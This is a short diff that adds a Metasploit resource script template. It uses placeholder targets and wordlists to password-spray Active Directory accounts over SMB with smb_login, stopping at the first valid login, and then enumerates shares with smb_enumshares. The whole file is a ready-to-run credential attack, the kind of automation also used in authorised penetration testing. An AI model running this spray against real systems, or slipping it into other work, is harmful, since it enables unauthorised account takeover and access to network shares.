@@ -1,0 +1,15 @@
+use auxiliary/scanner/smb/smb_login
+set RHOSTS %%TARGET_IP%%
+set RPORT %%TARGET_PORT%%
+set SMBDomain %%DOMAIN%%
+set USER_FILE %%WORDLISTS%%/ad_users.txt
+set PASS_FILE %%WORDLISTS%%/ad_spray_passwords.txt
+set BRUTEFORCE_SPEED 2
+set STOP_ON_SUCCESS true
+run
+
+use auxiliary/scanner/smb/smb_enumshares
+set RHOSTS %%TARGET_IP%%
+set RPORT %%TARGET_PORT%%
+set SMBDomain %%DOMAIN%%
+run
